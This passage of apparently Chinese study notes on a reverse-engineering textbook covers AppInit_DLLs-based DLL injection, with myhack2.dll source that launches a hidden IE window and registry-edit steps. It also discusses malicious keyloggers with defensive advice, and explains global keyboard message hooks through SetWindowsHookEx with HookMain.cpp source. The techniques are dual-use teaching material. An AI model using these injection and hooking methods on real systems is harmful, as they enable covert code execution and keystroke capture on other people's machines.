API加载用户DLL。所以，严格地说，相应DLL并不会被加载到所有进程，而只是、载至加载user32.dll的进程。请注意，Windows XP会忽略LoadAppInit_DLLs注册表项。</p></blockquote><h2 id="23-5-1-分析示例源码"><a href="#23-5-1-分析示例源码" class="headerlink" title="23.5.1 分析示例源码"></a>23.5.1 分析示例源码</h2><p><strong>myhack2.cpp</strong><br>下面分析一下myhack2.dll的源代码（myhack2.cpp ），如代码25-3所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// myhack2.cpp</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_CMD  <span class="hljs-string">L&quot;c:\\Program Files\\Internet Explorer\\iexplore.exe&quot;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_ADDR <span class="hljs-string">L&quot;http://www.naver.com&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_DST_PROC <span class="hljs-string">L&quot;notepad.exe&quot;</span></span><br><br>BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span><br>&#123;<br>    TCHAR szCmd[MAX_PATH]  = &#123;<span class="hljs-number">0</span>,&#125;;<br>    TCHAR szPath[MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br>    TCHAR *p = <span class="hljs-literal">NULL</span>;<br>    STARTUPINFO si = &#123;<span class="hljs-number">0</span>,&#125;;<br>    PROCESS_INFORMATION pi = &#123;<span class="hljs-number">0</span>,&#125;;<br><br>    si.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFO);<br>    si.dwFlags = STARTF_USESHOWWINDOW;<br>    si.wShowWindow = SW_HIDE;<br><br>    <span class="hljs-keyword">switch</span>( fdwReason )<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH : <br>        <span class="hljs-keyword">if</span>( !GetModuleFileName( <span class="hljs-literal">NULL</span>, szPath, MAX_PATH ) )<br>            <span class="hljs-keyword">break</span>;<br>   <br>        <span class="hljs-keyword">if</span>( !(p = _tcsrchr(szPath, <span class="hljs-string">&#x27;\\&#x27;</span>)) )<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>( _tcsicmp(p+<span class="hljs-number">1</span>, DEF_DST_PROC) )<br>            <span class="hljs-keyword">break</span>;<br><br>        wsprintf(szCmd, <span class="hljs-string">L&quot;%s %s&quot;</span>, DEF_CMD, DEF_ADDR);<br>        <span class="hljs-keyword">if</span>( !CreateProcess(<span class="hljs-literal">NULL</span>, (LPTSTR)(LPCTSTR)szCmd, <br>                            <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, <br>                            NORMAL_PRIORITY_CLASS, <br>                            <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi) )<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>( pi.hProcess != <span class="hljs-literal">NULL</span> )<br>            CloseHandle(pi.hProcess);<br><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>   <br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>myhack2.dll的源代码非常简单，若当前加载自己的进程为“notepad.exe”，则以隐藏模式运行IE，连接指定网站。这样就可以根据不同目的执行多种任务了。</p><h2 id="23-5-2-练习示例-myhack2-dll"><a href="#23-5-2-练习示例-myhack2-dll" class="headerlink" title="23.5.2 练习示例 myhack2.dll"></a>23.5.2 练习示例 myhack2.dll</h2><p>下面使用修改注册表项的方法做个DLL注入练习，注意操作顺序。 </p><p><strong>复制文件</strong></p><p>首先将要注入的DLL文件（myhack2.dll）复制到合适位置（在我电脑中的位置为C:\work\myhack2.dll）。</p><p><strong>修改注册表项</strong><br>运行注册表编辑器regedit.exe,进入如下路径。</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</p><p>编辑修改AppInit_DLLs表项的值，如图23-16所示（请输入myhack2.dll的绝对路径）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC23%E7%AB%A0%20DLL%E6%B3%A8%E5%85%A5.assets/image-20220221200145391.png" alt="image-20220221200145391"></p><p>然后修改LoadAppInit_DLLs注册表项的值为1，如图23-17所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC23%E7%AB%A0%20DLL%E6%B3%A8%E5%85%A5.assets/image-20220221200203443.png" alt="image-20220221200203443"></p><p><strong>重启系统</strong><br>注册表项修改完毕后，重启系统，使修改生效。系统重启完成后，使用Process Explorer查看myhack2.dll是否被注入所有（加载user32.dll的）进程。</p><p>从图23-18可以看到，myhack2.dll成功注入所有加载user32.dll的进程。但由于它的目标进程仅是notepad.exe进程，所以在其他进程中不会执行任何动作。运行notepad.exe，可以看到IE被（以隐藏模式）执行，如图23-19所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC23%E7%AB%A0%20DLL%E6%B3%A8%E5%85%A5.assets/image-20220221200330404.png" alt="图23-18 被注入的myhack2.dll"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC23%E7%AB%A0%20DLL%E6%B3%A8%E5%85%A5.assets/image-20220221200341434-16454450529533.png" alt="图23-19 notepad.exe的myhack2.dll运行IE"></p><blockquote><p>AppInit_DLLs注册表键非常强大，通过它几乎可以向所有进程注入DLL文件。若被注入的DLL出现问题（Bug）,则有可能导致Windows无法正常启动，所以修改该AppInit DLLs前务必彻查。</p></blockquote><h1 id="23-6-SetWindowsHookEx"><a href="#23-6-SetWindowsHookEx" class="headerlink" title="23.6 SetWindowsHookEx()"></a>23.6 SetWindowsHookEx()</h1><p>注入DLL的第三个方法就是消息钩取，即用SetWindowsHookEx() API安装好消息“钩子”，然后由OS将指定DLL （含有“钩子”过程）强制注入相应（带窗口的）进程。其工作原理与使用方法在第21章中已有详细讲解，请参考。</p><h1 id="23-7-小结"><a href="#23-7-小结" class="headerlink" title="23.7 小结"></a>23.7 小结</h1><p>本章我们学习了有关DLL注入的概念及具体的实现方法。这些内容在代码逆向分析中占据着很大比重，学习时要重点理解DLL注入技术的内部工作原理。此外，进程钩取与“打补丁”中也广泛应用DLL注入技术。</p><p>Q.开始学习代码逆向分析前，是不是得先学汇编语言、C语言、Win32 API? </p><p>A.我开始学习代码逆向分析技术时，完全不懂汇编语言（可能大部分代码逆向分析入员都如此）。入门阶段重要的不是汇编知识，而是调试器的使用方法、Windows内部结构等内容。C语言与Win32 API是一定要学好的，如果事先已经学过，那当然好；没学过也不要担心，遇到就随时查看并学习相关资料。初学时多碰壁反而是好事</p><p>Q.我编写了一个DLL文件，想注入Explorer.exe进程，但杀毒软件总是报告病毒。</p><p>A.向系统进程注入DLL时，大部分杀毒软件会根据行为算法将其标识为病毒并查杀。 </p><p>Q.前面的讲解中提到“CreateRemoteThread()实际调用的是LoadLibrary()”，实际生成的<br>不是线程吗？ </p><p>A.是的，会在目标进程中创建线程。与普通意义上的创建线程相比，调用LoadLibrary()占<br>据了很大比重，所以才这样说的（这可能给大家造成了混乱）。 </p><p>Q.进程A不具有串口通信功能，我想使用DLL注入技术为进程添加该功能，这可以实现吗？ </p><p>A.从技术角度来说，问题不大。只要把串口通信功能放入要注入的DLL即可。但如需与原程序联动，设计时必须进行更准确的分析，找到合适的方案（我认为这个问题其实就是灵活运用代码逆向分析技术的一个示例，即通过代码逆向分析技术，向程序中添加新功能或修改不足之处）。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第23章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第22章 恶意键盘记录器</title>
    <link href="/1999/02/20/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC22%E7%AB%A0%20%E6%81%B6%E6%84%8F%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/"/>
    <url>/1999/02/20/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC22%E7%AB%A0%20%E6%81%B6%E6%84%8F%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>第22章恶意键盘记录器<br>不能说（经用户同意）应用在管理中的键盘记录器（Key Logger） 一定是坏的，问题是那些在用户不知情的情况下、出于恶意运行的键盘记录器。本章将分析岀现这种恶意键盘记录器的原因。</p><h1 id="22-1恶意键盘记录器的目标"><a href="#22-1恶意键盘记录器的目标" class="headerlink" title="22.1恶意键盘记录器的目标"></a>22.1恶意键盘记录器的目标</h1><p>就是“金钱”。键盘记录器的基本功能是记录并保存用户在键盘上输人的信息，然后将这些信息转移到指定地点。信息化社会中，“信息就是金钱”。那么，如何利用键盘记录器赚钱呢？下面先看几个示例。</p><h2 id="22-1-1-在线游戏"><a href="#22-1-1-在线游戏" class="headerlink" title="22.1.1 在线游戏"></a>22.1.1 在线游戏</h2><p>现在，网吧随处可见，黑客随便去一个网吧，偷偷在一台电脑上安装好键盘记录器后离开。之后会有人用这台安装了键盘记录器的电脑玩在线游戏，用户使用这台电脑时，键盘记录器会偷偷记录下游戏账号（ID、Password ）,并通过邮件发送给黑客。黑客通过这些游戏账号登录在线游戏，可以把原玩家的游戏币与装备换成现金。玩过在线游戏的朋友应该对这种用游戏币和装备换钱的交易非常清楚（游戏装备的年交易额是普通人无法想象的）。</p><h2 id="22-1-2-网上银行"><a href="#22-1-2-网上银行" class="headerlink" title="22.1.2 网上银行"></a>22.1.2 网上银行</h2><p>那不玩在线游戏的人是不是就不会受到键盘记录器的侵害了呢？与每个人都息息相关的就是网上银行。如果网上银行的账户信息（ID、Password,账号）被盗该怎么办呢？如果存款余额神不知鬼不觉地清零了呢？</p><p>其实上述事例在国内外屡见不鲜，特别是在南美的一些国家和地区（墨西哥、巴西等），网银被盗走数万乃至数十万美元的用户相当多。虽然大部分网上银行都要求用户使用IE浏览器（Internet Explorer ）连接，并且在银行网站安装了ActiveX安全模块，进行着双重、三重保护，但 是仍然没有人敢断言网上银行100%安全。</p><h2 id="22-1-3-商业机密泄露"><a href="#22-1-3-商业机密泄露" class="headerlink" title="22.1.3 商业机密泄露"></a>22.1.3 商业机密泄露</h2><p>我们有时会看到这样的报道，某大公司因核心机密被泄露到国外而遭受重大损失。虽然这类商业信息遭泄露的例子并不多见，可一旦发生，其损害是十分巨大的（耗费几年时间，投人大量财力、精力研发的核心技术一旦遭到泄露，很有可能将企业推到生死存亡的关头）。对于一个国家亦是如此，若半导体、汽车、造船等关键技术被泄露到国外，整个国家可能就会陷入危机。从普通公司的泄密事件看，大部分公司内部都会一个“内线”，有了 “内线”就太方便设置键盘记录器了。</p><p>现在各位应该能感觉到键盘记录器的可怕了吧？为什么大部分杀毒软件都会把键盘记录器<br>识别为“恶意”文件？为什么登录网上银行（或者在线游戏）的相应网站时要安装ActiveX安全模块？ 一切都有了答案。</p><h1 id="22-2键盘记录器的种类与发展趋势"><a href="#22-2键盘记录器的种类与发展趋势" class="headerlink" title="22.2键盘记录器的种类与发展趋势"></a>22.2键盘记录器的种类与发展趋势</h1><p>各位听说过硬件版的键盘记录器吗？它就像一个USB存储器，连接在键盘线缆的末端从而设置到PC中。</p><p>其内部有一个闪存（flashmemory），能够直接接收并存储来自键盘的电子信号。最新产品还支持Wi-Fi无线连接，能够更方便地传送键盘输入信息。虽然安装起来有些不方便，但是一旦成功，安装用户根本无法觉察到自己从键盘输人的信息遭到了盗窃。谁会仔细看桌下的PC （而且是PC机箱的背面）呢？而且普通人就是看了也认不出来。事实上，仅用软件根本无法阻止这种硬件版的键盘记录器。各种杀毒软件以及键盘安全软件在阻止软件版键盘记录器方面做岀了大量努力，但是恶意键盘记录器编写者的目标（&#x3D;金钱）非常明确，所以不可能完全阻止所有键盘记录器。键盘记录器制作者们无限编写、散布恶意键盘记录器。对他们而言，这是一份关乎生计的“事业”，这些人会亲自测试自己编写的键盘记录器，以确保能够成功绕开各种安全软件。</p><p>这类键盘记录器未来会向着更精巧、更隐蔽的方向发展，另一方面我们却不得不一直使用键盘这类输人设备。</p><p>那么，如果不用键盘，是不是就可以不受键盘记录器的威胁呢？那些制作者们可能又会开发出全新形态的键盘记录器。若未来键盘被淘汰，大量使用“手写识别”或“声音识别”输入设备，相信那个时候一定会出现相应的“手写记录器”、“声音记录器”吧。</p><h1 id="22-3防范恶意键盘记录器"><a href="#22-3防范恶意键盘记录器" class="headerlink" title="22.3防范恶意键盘记录器"></a>22.3防范恶意键盘记录器</h1><p>虽然不能100%阻止恶意键盘记录器，但我们可以努力将其破坏性降到最低。以下这些简单的行为准则是我给各位的建议。</p><p>Keylogger防范守则： </p><p>□绝不在公共场合（网吧、学校自习室等）的PC中输人个人信息； </p><p>□经常更新安全软件；</p><p>□输入个人信息时灵活使用复制（剪切）&amp;粘贴（* ）;</p><p>□使用个人防火墙（即使键盘输人遭到非法记录，只要不泄露信息就没有危险）。 </p><p>若ID为reversecore，输人时先输入corereverse，再用鼠标选中core字符串，通过剪切&amp;粘贴功能最后形成reversecore。各位可以把这种方法应用到每个需要输入个人信息的地方，虽然有些麻烦，但能够增强一些安全性。当然，有些强大的键盘记录器甚至可以钩取剪贴板中的信息，所以 上面这个方法并不总是有效的，但用来防范一般的键盘记录器时，效果还是十分明显的。</p><h1 id="22-4个人信息"><a href="#22-4个人信息" class="headerlink" title="22.4个人信息"></a>22.4个人信息</h1><p>最后简单谈谈有关个人信息的问题。信息化社会中，个人信息即代表某个“人”。所以每个人都要重视起来，要有保护意识。特别是密码，一定要设置为只有自己知道的、较为复杂的形式（结合“数字+字符+特殊字符”，且最少8位），绝对不要告诉别人。输人密码时也要时刻注意周围情况，不要泄露。</p><blockquote><p>我看社会工程学技巧相关图书时，遇到过一些介绍专业黑客盗取键盘输入的例子。黑客在离目标对象一米远的地方假装看报纸，轻松盗取了受害人键盘输入的信息（登录信息）。黑客不必费劲去猜测系统管理员的密码，（可能的话）只要走近就能轻松窃取。如若得手，黑客就能很容易地获取系统管理员权限。</p></blockquote><p>一定要保管好重要的个人信息。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第22章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第7章 栈帧</title>
    <link href="/1999/02/19/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/"/>
    <url>/1999/02/19/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<p>第21章Windows消息钩取</p><h1 id="21-1-钩子"><a href="#21-1-钩子" class="headerlink" title="21.1 钩子"></a>21.1 钩子</h1><p>英文Hook—词，翻成中文是“钩子”、“鱼钩”的意思，泛指钓取所需东西而使用的一切工具。“钩子”这一基本含义延伸发展为“偷看或截取信息时所用的手段或工具”。下面举例向各位进一步说明“钩子”这一概念。</p><blockquote><p> “钩子”的概念<br>假设有一个非常重要的军事设施，其外围设置了3层岗哨以进行保护。外部人员若想进入，需要经过3层岗哨复杂的检查程序（身份确认、随身物品查验、访问事由说明等）。若间谍在通往该军事设施的道路上私设一个岗哨，经过该岗哨的人员未起疑心，通 过时履行同样的检查程序，那么间谍就可以坐享其成，轻松获取（甚至可以操纵）来往该岗哨的所有信息。</p></blockquote><p>像这样，为了偷看或截取来往信息而在中间设置岗哨的行为称为“挂钩”（或“安装钩子”），实际上，偷看或操作信息的行为就是人们常说的“钩取”（Hooking）。 </p><p>“钩取”技术广泛应用于计算机领域。其实，我们不仅可以查看来往于 “OS-应用程序-用户”之间的全部信息，也可以操作它们，并且神不知鬼不觉。具体方法有很多，其中最基本的是“消 息钩子”（Message Hook ），下面会详细介绍。</p><p>“钓取”是代码逆向分析中非常重要且有趣的主题，后面会逐一介绍各种“钩取”方法。</p><h1 id="21-2-消息钩子"><a href="#21-2-消息钩子" class="headerlink" title="21.2 消息钩子"></a>21.2 消息钩子</h1><p>Windows操作系统向用户提供GUI （Graphic User Interface,图形用户界面），它以事件驱动（Event Driven）方式工作。在操作系统中借助键盘、鼠标，选择菜单、按钮，以及移动鼠标、改变窗口大小与位置等都是事件（Event）。发生这样的事件时，OS会把事先定义好的消息发送给相应的应用程序，应用程序分析收到的信息后执行相应动作（上述过程在《Windows程序设计》一书中有详尽说明）。也就是说，敲击键盘时，消息会从OS移动到应用程序。所谓的“消息钩子”就在此间偷看这些信息。为了帮助各位进一步理解它，下面以键盘消息为例说明。请看图21-1。</p><p>先讲解常规Windows消息流。 </p><p>□发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]。 </p><p>□ OS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序[application message queue]中。 </p><p>□应用程序（如记事本）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应的事件处理程序处理。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220220194722887.png" alt="图21-1 消息钩取工作原理"></p><p>正如在图21-1中看到的一样，OS消息队列与应用程序消息队列之间存在一条“钩链”（Hook Chain），设置好键盘消息钩子之后，处于“钩链”中的键盘消息钩子会比应用程序先看到相应信息。在键盘消息钩子函数的内部，除了可以查看消息之外，还可以修改消息本身，而且还能对消息实施拦截，阻止消息传递。</p><blockquote><p>可以同时设置多个相同的键盘消息钩子。按照设置顺序依次调用这些钩子，它们 组成的链条称为“钩链”。</p></blockquote><p>像这样的消息钩子功能是Windows操作系统提供的基本功能，其中最具代表性的是MS Visual Studio中提供的SPY++，它是一个功能十分强大的消息钩取程序，能够查看操作系统中来往的所有消息。</p><h1 id="21-3-SetWindowsHookEx"><a href="#21-3-SetWindowsHookEx" class="headerlink" title="21.3 SetWindowsHookEx()"></a>21.3 SetWindowsHookEx()</h1><p>使用SetWindowsHookEx() API可轻松实现消息钩子，SetWindowsHookEx() API的定义如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK <span class="hljs-title function_">SetWindowsHookEx</span><span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-type">int</span> idHook,</span><br><span class="hljs-params"> <span class="hljs-comment">// type of hook to install</span></span><br><span class="hljs-params">HOOKPROC lpfn,</span><br><span class="hljs-params"> <span class="hljs-comment">// address of hook procedure</span></span><br><span class="hljs-params">HINSTANCE hMod,</span><br><span class="hljs-params"> <span class="hljs-comment">// handle of application instance</span></span><br><span class="hljs-params">DWORD dwThreadId</span><br><span class="hljs-params"> <span class="hljs-comment">// identity of thread to install hook for</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>钩子过程（hook procedure）是由操作系统调用的回调函数。安装消息“钩子“时，“钩子”过程需要存在于某个DLL内部，且该DLL的示例句柄（instance handle ）即是hMod。</p><blockquote><p>若dwThreadID参数被设置为0，则安装的钓子为“全局钓子”（Global Hook ）,它会影响到运行中的（以及以后要运行的）所有进程。</p></blockquote><p>像这样，使用SetWindowsHookExO设置好钩子之后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入（injection）相应进程，然后调用注册的“钩子”过程。注入 进程时用户几乎不需要做什么，非常方便。</p><h1 id="21-4-键盘消息钩取练习"><a href="#21-4-键盘消息钩取练习" class="headerlink" title="21.4 键盘消息钩取练习"></a>21.4 键盘消息钩取练习</h1><p>本节将做一个简单的键盘消息钩取练习，以进一步加深各位对前面内容的理解。请看图21-2。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220220194939307.png" alt="图21-2 键盘消息钩取"></p><p>KeyHook.dll文件是一个含有钩子过程（KeyboardProc ）的DLL文件。HookMain.exe是最先加载KeyHook.dll并安装键盘钩子的程序。HookMain.exe加载KeyHook.dll文件后使用SetWindowsHookEx()安装键盘钩子（KeyboardProc）。若其他进程（explorer.exe、iexplore.exe、notepad.exe等）中发生键盘输入事件，OS就会强制将KeyHook.dll加载到相应进程的内存，然后调用KeyboardProc()函数。</p><p>这里需要注意的一点是，OS会将KeyHooLdll强制加载到发生键盘输入事件的所有进程。换言之，消息钩取技术常常被用作一种DLL注入技术（后面会单独讲解DLL注入的相关内容）</p><h2 id="21-4-1-练习示例-HookMain-exe"><a href="#21-4-1-练习示例-HookMain-exe" class="headerlink" title="21.4.1 练习示例 HookMain.exe"></a>21.4.1 练习示例 HookMain.exe</h2><p>本节通过示例来练习一下键盘钩取技术，拦截notepad.exe进程的键盘消息，使之无法显示在记事本中。</p><p><strong>运行HookMain.exe - 安装键盘钩子</strong></p><p>首先运行HookMain.exe程序，如图21-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220220195859211.png" alt="图21-3 运行HookMain.exe"></p><p>运行HookMain.exe程序后，输岀”press ‘q’ to quit!”信息，提示在HookMain.exe程序中输入”q”即可停止键盘钩取。</p><p><strong>运行Notepad.exe程序</strong></p><p>当前系统中已安装好键盘钩子。运行Notepad.exe，用键盘输入。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220220202231691.png" alt="图2-14 Notepad.exe进程忽视键盘输人"></p><p>如图所示，Notepad.exe进程忽视了用户的键盘c。使用Process Explorer查看notepad.exe进程，可以看到KeyHook.dll已经加载其中（参考图2-14）。</p><p>在Process Explorer中检索注入KeyHook.dll的所有进程，如图21-5所示。一个进程开始运行并发生键盘事件时，KeyHook.dll就会注入其中（但其实忽视键盘事件的仅有notepad.exe进程，其他进程会正常处理键盘事件）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220220202617855.png" alt="图21-5 注入KeyHook.dll的所有进程"></p><p><strong>HookMain.exe终止-拆除键盘钩子</strong></p><p>在HookMain.exe程序中输入“q”命令，HookMain.exe将拆除键盘钩子，并终止运行。</p><p>拆除键盘钩子后，在notepad.exe （记事本）中使用键盘输入，可以发现记事本又能正常接收了。在Process Explorer中检索KeyHook.dll会发现，无任何一个进程加载KeyHook.dll。</p><p>拆除键盘钩子后，相关进程就会将KeyHook.dll文件全部卸载（Unloading ）。</p><h2 id="21-4-2-分析源代码"><a href="#21-4-2-分析源代码" class="headerlink" title="21.4.2 分析源代码"></a>21.4.2 分析源代码</h2><p>下面分析一下示例的源代码。</p><blockquote><p>示例是使用 MS Visual C++2010 Express Edition 编写的，已在 Windows XP&#x2F;7 （32 位）环境中通过测试。为便于讲解，我已经去除了示例代码中的返回值&#x2F;错误处理语句。</p></blockquote><p><strong>HookMain.cpp</strong><br>首先看一下HookMain.exe文件的源代码（HookMain.cpp ）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;conio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>DEF_DLL_NAME<span class="hljs-string">&quot;KeyHook.dll&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>DEF_HOOKSTART<span class="hljs-string">&quot;HookStart&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>DEF_HOOKSTOP<span class="hljs-string">&quot;HookStop&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*PFN_HOOKSTART)</span><span class="hljs-params">()</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*PFN_HOOKSTOP)</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>HMODULEhDll = <span class="hljs-literal">NULL</span>;<br>PFN_HOOKSTARTHookStart = <span class="hljs-literal">NULL</span>;<br>PFN_HOOKSTOPHookStop = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">char</span>ch = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 加载KeyHook.dll</span><br>hDll = LoadLibraryA(DEF_DLL_NAME);<br>    <span class="hljs-keyword">if</span>( hDll == <span class="hljs-literal">NULL</span> )<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LoadLibrary(%s) failed!!! [%d]&quot;</span>, DEF_DLL_NAME, GetLastError());<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 获取导出函数地址</span><br>HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);<br>HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);<br><br>    <span class="hljs-comment">// 开始钩取</span><br>HookStart();<br><br>    <span class="hljs-comment">// 等待直到用户输入&quot;q&quot;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;press &#x27;q&#x27; to quit!\n&quot;</span>);<br><span class="hljs-keyword">while</span>( _getch() != <span class="hljs-string">&#x27;q&#x27;</span> );<br><br>    <span class="hljs-comment">// 终止钩取</span><br>HookStop();<br><br>    <span class="hljs-comment">// 卸载KeyHook.dll</span><br>FreeLibrary(hDll);<br>&#125;<br></code></pre></td></tr></table></figure><p>源代码非常简单。先加载KeyHook.dll文件，然后调用HookStart()函数开始钩取，用户输入“q” 